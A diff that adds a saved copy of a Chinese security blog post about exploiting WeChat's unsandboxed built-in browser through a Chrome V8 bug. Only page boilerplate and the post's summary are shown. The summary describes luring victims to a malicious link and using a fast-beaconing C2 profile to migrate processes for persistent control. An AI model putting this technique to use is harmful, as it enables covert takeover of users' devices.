@@ -1,0 +1,1033 @@
+<!DOCTYPE html>
+<!-- saved from url=(0144)https://ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/ -->
+<html lang="zh-CN" data-theme="light" class="macos desktop landscape"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>关于微信内置浏览器 达到持久控制 | Liqun</title><meta name="keywords" content="漏洞复现,微信rce"><meta name="author" content="Li qun"><meta name="copyright" content="Li qun"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="关于微信内置浏览器 达到持久控制最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权解决上述问题1.加载自定义 malleable C2配置文件 从而达到主机一上线跳默认为1秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程2.加载一个">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于微信内置浏览器 达到持久控制">
+<meta property="og:url" content="https://www.ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/index.html">
+<meta property="og:site_name" content="Liqun">
+<meta property="og:description" content="关于微信内置浏览器 达到持久控制最近谷歌浏览器爆出了命令执行到处都是就不赘述了，由于微信调用了谷歌浏览器内核而且默认没开沙盒模式导致漏洞但是爆出来的利用是依赖在微信浏览器进程上的，对方点击恶意链接后可正常上线可是一旦关闭内置浏览器就会失去控制权解决上述问题1.加载自定义 malleable C2配置文件 从而达到主机一上线跳默认为1秒，就可自动在目标打开浏览器短暂的时间里尽快转移进程2.加载一个">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post3.webp">
+<meta property="article:published_time" content="2021-04-18T08:56:00.000Z">
+<meta property="article:modified_time" content="2021-04-18T10:59:33.260Z">
+<meta property="article:author" content="Li qun">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="微信rce">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post3.webp"><link rel="shortcut icon" href="https://ailiqun.xyz/img/favicon.ico"><link rel="canonical" href="https://www.ailiqun.xyz/2021/04/18/%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8-v8-%E5%9C%A8%E5%BE%AE%E4%BF%A1%E4%B8%8A%E7%9A%84%E5%BA%94%E7%94%A8/"><link rel="preconnect" href="https://cdn.jsdelivr.net/"><link rel="preconnect" href="https://s4.cnzz.com/"><link rel="stylesheet" href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/index.css"><link rel="stylesheet" href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/all.min.css" media="all" onload="this.media=&#39;all&#39;"><script type="text/javascript" async="" charset="utf-8" src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/core.php"></script><script async="async" data-pjax="data-pjax" src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/z_stat.php"></script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: true
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-04-18 18:59:33'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><link rel="stylesheet" href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/鼠标.css"><link rel="stylesheet" href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/昵称颜色.css"><link rel="stylesheet" href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/页脚透明.css"><link rel="stylesheet" href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/滚动条.css"><link rel="stylesheet" href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/个性标签.css"><link rel="stylesheet" href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/font-awesome-animation.min.css"><link rel="stylesheet" href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/iconfont.min.css"><link rel="stylesheet" href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/font_2378142_a0rdikziucl.css"><meta name="generator" content="Hexo 5.3.0"><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/Valine.min.js" async=""></script><style type="text/css">.v[data-class=v]{font-size:16px;text-align:left}.v[data-class=v] *{-webkit-box-sizing:border-box;box-sizing:border-box;line-height:1.75}.v[data-class=v] .status-bar,.v[data-class=v] .veditor,.v[data-class=v] .vinput,.v[data-class=v] p,.v[data-class=v] pre code{color:#555}.v[data-class=v] .vsys,.v[data-class=v] .vtime{color:#b3b3b3}.v[data-class=v] .text-right{text-align:right}.v[data-class=v] .text-center{text-align:center}.v[data-class=v] img{max-width:100%;border:none}.v[data-class=v] hr{margin:.825em 0;border-color:#f6f6f6;border-style:dashed}.v[data-class=v].hide-avatar .vimg{display:none}.v[data-class=v] a{position:relative;cursor:pointer;color:#1abc9c;text-decoration:none;display:inline-block}.v[data-class=v] a:hover{color:#d7191a}.v[data-class=v] code,.v[data-class=v] pre{background-color:#f8f8f8;padding:.2em .4em;border-radius:3px;font-size:85%;margin:0}.v[data-class=v] pre{padding:10px;overflow:auto;line-height:1.45}.v[data-class=v] pre code{padding:0;background:transparent;white-space:pre-wrap;word-break:keep-all}.v[data-class=v] blockquote{color:#666;margin:.5em 0;padding:0 0 0 1em;border-left:8px solid hsla(0,0%,93%,.5)}.v[data-class=v] .vinput{border:none;resize:none;outline:none;padding:10px 5px;max-width:100%;font-size:.775em}.v[data-class=v] input[type=checkbox],.v[data-class=v] input[type=radio]{display:inline-block;vertical-align:middle;margin-top:-2px}.v[data-class=v] .vicon{cursor:pointer;display:inline-block;overflow:hidden;fill:#555;vertical-align:middle}.v[data-class=v] .vicon+.vicon{margin-left:10px}.v[data-class=v] .vicon.actived{fill:#66b1ff}.v[data-class=v] .vrow{font-size:0;padding:10px 0}.v[data-class=v] .vrow .vcol{display:inline-block;vertical-align:middle;font-size:14px}.v[data-class=v] .vrow .vcol.vcol-20{width:20%}.v[data-class=v] .vrow .vcol.vcol-30{width:30%}.v[data-class=v] .vrow .vcol.vcol-40{width:40%}.v[data-class=v] .vrow .vcol.vcol-50{width:50%}.v[data-class=v] .vrow .vcol.vcol-60{width:60%}.v[data-class=v] .vrow .vcol.vcol-70{width:70%}.v[data-class=v] .vrow .vcol.vcol-80{width:80%}.v[data-class=v] .vrow .vcol.vctrl{font-size:12px}.v[data-class=v] .emoji,.v[data-class=v] .vemoji{max-width:25px;vertical-align:middle;margin:0 1px;display:inline-block}.v[data-class=v] .vwrap{border:1px solid #f0f0f0;border-radius:4px;margin-bottom:10px;overflow:hidden;position:relative;padding:10px}.v[data-class=v] .vwrap input{background:transparent}.v[data-class=v] .vwrap .vedit{position:relative;padding-top:10px}.v[data-class=v] .vwrap .cancel-reply-btn{position:absolute;right:5px;top:5px;cursor:pointer}.v[data-class=v] .vwrap .vemojis{display:none;font-size:18px;max-height:145px;overflow:auto;padding-bottom:10px;-webkit-box-shadow:0 0 1px #f0f0f0;box-shadow:0 0 1px #f0f0f0}.v[data-class=v] .vwrap .vemojis i{font-style:normal;padding-top:7px;width:36px;cursor:pointer;text-align:center;display:inline-block;vertical-align:middle}.v[data-class=v] .vwrap .vpreview{padding:7px;-webkit-box-shadow:0 0 1px #f0f0f0;box-shadow:0 0 1px #f0f0f0}.v[data-class=v] .vwrap .vheader .vinput{width:33.33%;border-bottom:1px dashed #dedede}.v[data-class=v] .vwrap .vheader.item2 .vinput{width:50%}.v[data-class=v] .vwrap .vheader.item1 .vinput{width:100%}.v[data-class=v] .vwrap .vheader .vinput:focus{border-bottom-color:#eb5055}@media screen and (max-width:520px){.v[data-class=v] .vwrap .vheader.item2 .vinput,.v[data-class=v] .vwrap .vheader .vinput{width:100%}}.v[data-class=v] .vpower{color:#999;font-size:.75em;padding:.5em 0}.v[data-class=v] .vpower a{font-size:.75em}.v[data-class=v] .vcount{padding:5px;font-weight:600;font-size:1.25em}.v[data-class=v] ol,.v[data-class=v] ul{padding:0;margin-left:1.25em}.v[data-class=v] .txt-center{text-align:center}.v[data-class=v] .txt-right{text-align:right}.v[data-class=v] .pd5{padding:5px}.v[data-class=v] .pd10{padding:10px}.v[data-class=v] .veditor{width:100%;min-height:8.75em;font-size:.875em;background:transparent;resize:vertical;-webkit-transition:all .25s ease;transition:all .25s ease}.v[data-class=v] .vbtn{-webkit-transition-duration:.4s;transition-duration:.4s;text-align:center;color:#555;border:1px solid #ededed;border-radius:.3em;display:inline-block;background:transparent;margin-bottom:0;font-weight:400;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;white-space:nowrap;padding:.5em 1.25em;font-size:.875em;line-height:1.42857143;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;outline:none}.v[data-class=v] .vbtn+.vbtn{margin-left:1.25em}.v[data-class=v] .vbtn:active,.v[data-class=v] .vbtn:hover{color:#3090e4;border-color:#3090e4}.v[data-class=v] .vbtn:disabled{border-color:#e1e1e1;color:#e1e1e1;background-color:#fdfafa;cursor:not-allowed}.v[data-class=v] .vempty{padding:1.25em;text-align:center;color:#555;overflow:auto}.v[data-class=v] .vsys{display:inline-block;padding:.2em .5em;font-size:.75em;border-radius:.2em;margin-right:.3em}@media screen and (max-width:520px){.v[data-class=v] .vsys{display:none}}.v[data-class=v] .vcards{width:100%}.v[data-class=v] .vcards .vcard{padding-top:1.25em;position:relative;display:block}.v[data-class=v] .vcards .vcard:after{content:"";clear:both;display:block}.v[data-class=v] .vcards .vcard .vimg{width:3.125em;height:3.125em;float:left;border-radius:50%;margin-right:.7525em;border:1px solid #f5f5f5;padding:.125em}@media screen and (max-width:720px){.v[data-class=v] .vcards .vcard .vimg{width:2.5em;height:2.5em}}.v[data-class=v] .vcards .vcard .vhead{line-height:1.5;margin-top:0}.v[data-class=v] .vcards .vcard .vhead .vnick{position:relative;font-size:.875em;font-weight:500;margin-right:.875em;cursor:pointer;text-decoration:none;display:inline-block}.v[data-class=v] .vcards .vcard .vhead .vnick:hover{color:#d7191a}.v[data-class=v] .vcards .vcard .vh{overflow:hidden;padding-bottom:.5em;border-bottom:1px dashed #f5f5f5}.v[data-class=v] .vcards .vcard .vh .vtime{font-size:.75em;margin-right:.875em}.v[data-class=v] .vcards .vcard .vh .vmeta{line-height:1;position:relative}.v[data-class=v] .vcards .vcard .vh .vmeta .vat{font-size:.8125em;color:#ef2f11;cursor:pointer;float:right}.v[data-class=v] .vcards .vcard:last-child .vh{border-bottom:none}.v[data-class=v] .vcards .vcard .vcontent{word-wrap:break-word;word-break:break-all;font-size:.875em;line-height:2;position:relative;margin-bottom:.75em;padding-top:.625em}.v[data-class=v] .vcards .vcard .vcontent.expand{cursor:pointer;max-height:8em;overflow:hidden}.v[data-class=v] .vcards .vcard .vcontent.expand:before{display:block;content:"";position:absolute;width:100%;left:0;top:0;bottom:3.15em;background:-webkit-gradient(linear,left top,left bottom,from(hsla(0,0%,100%,0)),to(hsla(0,0%,100%,.9)));background:linear-gradient(180deg,hsla(0,0%,100%,0),hsla(0,0%,100%,.9));z-index:999}.v[data-class=v] .vcards .vcard .vcontent.expand:after{display:block;content:attr(data-expand);text-align:center;color:#828586;position:absolute;width:100%;height:3.15em;line-height:3.15em;left:0;bottom:0;z-index:999;background:hsla(0,0%,100%,.9)}.v[data-class=v] .vcards .vcard .vquote{padding-left:1em;border-left:1px dashed hsla(0,0%,93%,.5)}.v[data-class=v] .vcards .vcard .vquote .vimg{width:2.225em;height:2.225em}.v[data-class=v] .vpage .vmore{margin:1em 0}.v[data-class=v] .clear{content:"";display:block;clear:both}@-webkit-keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@keyframes spin{0%{-webkit-transform:rotate(0deg);transform:rotate(0deg)}to{-webkit-transform:rotate(1turn);transform:rotate(1turn)}}@-webkit-keyframes pulse{50%{background:#dcdcdc}}@keyframes pulse{50%{background:#dcdcdc}}.v[data-class=v] .vspinner{width:22px;height:22px;display:inline-block;border:6px double #a0a0a0;border-top-color:transparent;border-bottom-color:transparent;border-radius:50%;-webkit-animation:spin 1s infinite linear;animation:spin 1s infinite linear;position:relative;vertical-align:middle;margin:0 5px}.dark .v[data-class=v] .status-bar,.dark .v[data-class=v] .veditor,.dark .v[data-class=v] .vinput,.dark .v[data-class=v] p,.dark .v[data-class=v] pre code,.night .v[data-class=v] .status-bar,.night .v[data-class=v] .veditor,.night .v[data-class=v] .vinput,.night .v[data-class=v] p,.night .v[data-class=v] pre code,.theme__dark .v[data-class=v] .status-bar,.theme__dark .v[data-class=v] .veditor,.theme__dark .v[data-class=v] .vinput,.theme__dark .v[data-class=v] p,.theme__dark .v[data-class=v] pre code,[data-theme=dark] .v[data-class=v] .status-bar,[data-theme=dark] .v[data-class=v] .veditor,[data-theme=dark] .v[data-class=v] .vinput,[data-theme=dark] .v[data-class=v] p,[data-theme=dark] .v[data-class=v] pre code{color:#b2b2b5}.dark .v[data-class=v] .vsys,.dark .v[data-class=v] .vtime,.night .v[data-class=v] .vsys,.night .v[data-class=v] .vtime,.theme__dark .v[data-class=v] .vsys,.theme__dark .v[data-class=v] .vtime,[data-theme=dark] .v[data-class=v] .vsys,[data-theme=dark] .v[data-class=v] .vtime{color:#929298}.dark .v[data-class=v] code,.dark .v[data-class=v] pre,.dark .v[data-class=v] pre code,.night .v[data-class=v] code,.night .v[data-class=v] pre,.night .v[data-class=v] pre code,.theme__dark .v[data-class=v] code,.theme__dark .v[data-class=v] pre,.theme__dark .v[data-class=v] pre code,[data-theme=dark] .v[data-class=v] code,[data-theme=dark] .v[data-class=v] pre,[data-theme=dark] .v[data-class=v] pre code{color:#929298;background-color:#151414}.dark .v[data-class=v] .vwrap,.night .v[data-class=v] .vwrap,.theme__dark .v[data-class=v] .vwrap,[data-theme=dark] .v[data-class=v] .vwrap{border-color:#b2b2b5}.dark .v[data-class=v] .vicon,.night .v[data-class=v] .vicon,.theme__dark .v[data-class=v] .vicon,[data-theme=dark] .v[data-class=v] .vicon{fill:#b2b2b5}.dark .v[data-class=v] .vicon.actived,.night .v[data-class=v] .vicon.actived,.theme__dark .v[data-class=v] .vicon.actived,[data-theme=dark] .v[data-class=v] .vicon.actived{fill:#66b1ff}.dark .v[data-class=v] .vbtn,.night .v[data-class=v] .vbtn,.theme__dark .v[data-class=v] .vbtn,[data-theme=dark] .v[data-class=v] .vbtn{color:#b2b2b5;border-color:#b2b2b5}.dark .v[data-class=v] .vbtn:hover,.night .v[data-class=v] .vbtn:hover,.theme__dark .v[data-class=v] .vbtn:hover,[data-theme=dark] .v[data-class=v] .vbtn:hover{color:#66b1ff;border-color:#66b1ff}.dark .v[data-class=v] a:hover,.night .v[data-class=v] a:hover,.theme__dark .v[data-class=v] a:hover,[data-theme=dark] .v[data-class=v] a:hover{color:#d7191a}.dark .v[data-class=v] .vcards .vcard .vcontent.expand:before,.night .v[data-class=v] .vcards .vcard .vcontent.expand:before,.theme__dark .v[data-class=v] .vcards .vcard .vcontent.expand:before,[data-theme=dark] .v[data-class=v] .vcards .vcard .vcontent.expand:before{background:-webkit-gradient(linear,left top,left bottom,from(rgba(0,0,0,.3)),to(rgba(0,0,0,.7)));background:linear-gradient(180deg,rgba(0,0,0,.3),rgba(0,0,0,.7))}.dark .v[data-class=v] .vcards .vcard .vcontent.expand:after,.night .v[data-class=v] .vcards .vcard .vcontent.expand:after,.theme__dark .v[data-class=v] .vcards .vcard .vcontent.expand:after,[data-theme=dark] .v[data-class=v] .vcards .vcard .vcontent.expand:after{background:rgba(0,0,0,.7)}@media (prefers-color-scheme:dark){.v[data-class=v] .status-bar,.v[data-class=v] .veditor,.v[data-class=v] .vinput,.v[data-class=v] p,.v[data-class=v] pre code{color:#b2b2b5}.v[data-class=v] .vsys,.v[data-class=v] .vtime{color:#929298}.v[data-class=v] code,.v[data-class=v] pre,.v[data-class=v] pre code{color:#929298;background-color:#151414}.v[data-class=v] .vwrap{border-color:#b2b2b5}.v[data-class=v] .vicon{fill:#b2b2b5}.v[data-class=v] .vicon.actived{fill:#66b1ff}.v[data-class=v] .vbtn{color:#b2b2b5;border-color:#b2b2b5}.v[data-class=v] .vbtn:hover{color:#66b1ff;border-color:#66b1ff}.v[data-class=v] a:hover{color:#d7191a}.v[data-class=v] .vcards .vcard .vcontent.expand:before{background:-webkit-gradient(linear,left top,left bottom,from(rgba(0,0,0,.3)),to(rgba(0,0,0,.7)));background:linear-gradient(180deg,rgba(0,0,0,.3),rgba(0,0,0,.7))}.v[data-class=v] .vcards .vcard .vcontent.expand:after{background:rgba(0,0,0,.7)}}</style><script type="text/javascript" charset="utf-8" async="" src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/L2Dwidget.0.min.js"></script><script id="webpushr-jssdk" async="" src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/app.min.js"></script><link rel="stylesheet" type="text/css" href="./关于微信内置浏览器 达到持久控制 _ Liqun_files/jquery.fancybox.min.css"><script src="./关于微信内置浏览器 达到持久控制 _ Liqun_files/pangu.min.js" async=""></script>
+<style>
+  .live2d-widget-dialog-container {
+    width: 300px;
+    height: 120px;
+    position: absolute;
+    bottom: 65%;
+    right: 0px;
+    transform-origin: right;
+    padding: 12px;
+    box-sizing: border-box;
+    -webkit-font-smoothing: antialiased;
+  }
+  .live2d-widget-dialog {
+    width: 100%;
+    height: 100%;
+    color: #917159;
+    font-size: 16px;
+    padding: 12px;
+    border: 2px solid rgb(236, 203, 180);
+    background: rgb(252, 248, 244);
+    box-sizing: border-box;
+    border-radius: 10px;
+    transform: rotate(-2deg);
+    opacity: 0;
+    transition: 200ms opacity;
+    box-shadow: rgba(0, 0, 0, 0.12) 0px 1px 6px, rgba(0, 0, 0, 0.12) 0px 1px 4px;
+    animation: live2d-widget-dialog-tingle 4s ease-in-out 0s infinite alternate;
+  }
+  @keyframes live2d-widget-dialog-tingle {
+    0% { transform: translate(-1px, 1.5px) rotate(-2deg); }
+    100% { transform: translate(1px, -1.5px) rotate(2deg); }
+  }
+</style>
+</head><body style="overflow: auto;"><a href="javascript:void(0);" onclick="preloader.endLoading();" title="！！！！嫌慢就点一下！！！！" data-pjax-state=""><div id="loading-box" class="loaded"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="scarecrow"><div class="scarecrow__hat"><div class="scarecrow__ribbon"></div></div><div class="scarecrow__head"><div class="scarecrow__eye"></div><div class="scarecrow__eye"></div><div class="scarecrow__mouth"></div><div class="scarecrow__pipe"></div></div><div class="scarecrow__body"><div class="scarecrow__glove scarecrow__glove--l"></div><div class="scarecrow__sleeve scarecrow__sleeve--l"></div><div class="scarecrow__bow"></div><div class="scarecrow__shirt"></div><div class="scarecrow__coat"></div><div class="scarecrow__waistcoat"></div><div class="scarecrow__sleeve scarecrow__sleeve--r"></div><div class="scarecrow__glove scarecrow__glove--r"></div><div class="scarecrow__coattails"></div><div class="scarecrow__pants"></div></div><div class="scarecrow__arms"></div><div class="scarecrow__leg">  </div></div></div></a><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/txx.webp" onerror="onerror=null;src=&#39;/img/friend_404.gif&#39;" alt="avatar"></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="https://ailiqun.xyz/archives/" data-pjax-state=""><div class="headline">文章</div><div class="length-num">23</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="https://ailiqun.xyz/tags/" data-pjax-state=""><div class="headline">标签</div><div class="length-num">36</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="https://ailiqun.xyz/categories/" data-pjax-state=""><div class="headline">分类</div><div class="length-num">8</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);" data-pjax-state=""><i class="fa-fw iconfont icon-aixin"></i><span> 在线工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://ailiqun.xyz/2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/" data-pjax-state=""><i class="fa-fw iconfont iconhuizong faa-vertical animated"></i><span> 工具汇总入口</span></a></li><li><a class="site-page" href="https://ailiqun.xyz/#" data-pjax-state=""><span> ---- 信息收集 ----</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://x.threatbook.cn/"><i class="fa-fw iconfont iconsaomiao2"></i><span> 微步在线</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://community.riskiq.com/home/"><i class="fa-fw iconfont icon-shuaxin"></i><span> RiskIQ</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/url/"><i class="fa-fw iconfont iconbingdu"></i><span> VirusTotal 扫毒</span></a></li><li><a class="site-page" href="https://ailiqun.xyz/#" data-pjax-state=""><span> - 资产测绘 -</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://fofa.so/"><i class="fa-fw iconfont iconf"></i><span> Fofa  网络安全搜索引擎</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.shodan.io/"><i class="fa-fw iconfont iconcircle"></i><span> Shodan 网络空间搜索引擎</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.zoomeye.org/"><i class="fa-fw iconfont iconyanjing"></i><span> 钟馗之眼 - ZoomEye</span></a></li><li><a class="site-page" href="https://ailiqun.xyz/#" data-pjax-state=""><span> - 指纹识别 -</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.yunsee.cn/"><i class="fa-fw iconfont iconwangzhan"></i><span> 云悉 CMS 指纹识别平台</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://scan.top15.cn/web/"><i class="fa-fw iconfont iconTx"></i><span> TScan 指纹识别</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="https://ailiqun.xyz/" data-pjax-state=""><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="https://ailiqun.xyz/archives/" data-pjax-state=""><i class="fa-fw fa fa-archive"></i><span> 时间排序</span></a></div><div class="menus_item"><a class="site-page" href="https://ailiqun.xyz/%E5%9C%A8%E7%BA%BF%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/" data-pjax-state=""><i class="fa-fw iconfont iconjiemi"></i><span> 在线加解密工具</span></a></div><div class="menus_item"><a class="site-page" href="https://ailiqun.xyz/tags/" data-pjax-state=""><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="https://ailiqun.xyz/categories/" data-pjax-state=""><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg nav-fixed nav-visible" id="page-header" style="background-image: url(&#39;https://ailiqun.oss-cn-shenzhen.aliyuncs.com/img/post3.webp&#39;)"><nav id="nav" class="show"><span id="blog_name"><a id="site-name" href="https://ailiqun.xyz/" data-pjax-state="">Liqun</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" data-pjax-state=""><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);" data-pjax-state=""><i class="fa-fw iconfont icon-aixin"></i><span> 在线工具</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://ailiqun.xyz/2022/07/24/%E5%9C%A8%E7%BA%BF%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/" data-pjax-state=""><i class="fa-fw iconfont iconhuizong faa-vertical animated"></i><span> 工具汇总入口</span></a></li><li><a class="site-page" href="https://ailiqun.xyz/#" data-pjax-state=""><span> ---- 信息收集 ----</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://x.threatbook.cn/"><i class="fa-fw iconfont iconsaomiao2"></i><span> 微步在线</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://community.riskiq.com/home/"><i class="fa-fw iconfont icon-shuaxin"></i><span> RiskIQ</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.virustotal.com/gui/home/url/"><i class="fa-fw iconfont iconbingdu"></i><span> VirusTotal 扫毒</span></a></li><li><a class="site-page" href="https://ailiqun.xyz/#" data-pjax-state=""><span> - 资产测绘 -</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://fofa.so/"><i class="fa-fw iconfont iconf"></i><span> Fofa  网络安全搜索引擎</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.shodan.io/"><i class="fa-fw iconfont iconcircle"></i><span> Shodan 网络空间搜索引擎</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.zoomeye.org/"><i class="fa-fw iconfont iconyanjing"></i><span> 钟馗之眼 - ZoomEye</span></a></li><li><a class="site-page" href="https://ailiqun.xyz/#" data-pjax-state=""><span> - 指纹识别 -</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://www.yunsee.cn/"><i class="fa-fw iconfont iconwangzhan"></i><span> 云悉 CMS 指纹识别平台</span></a></li><li><a class="site-page" target="_blank" rel="noopener" href="https://scan.top15.cn/web/"><i class="fa-fw iconfont iconTx"></i><span> TScan 指纹识别</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="https://ailiqun.xyz/" data-pjax-state=""><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="https://ailiqun.xyz/archives/" data-pjax-state=""><i class="fa-fw fa fa-archive"></i><span> 时间排序</span></a></div><div class="menus_item"><a class="site-page" href="https://ailiqun.xyz/%E5%9C%A8%E7%BA%BF%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/" 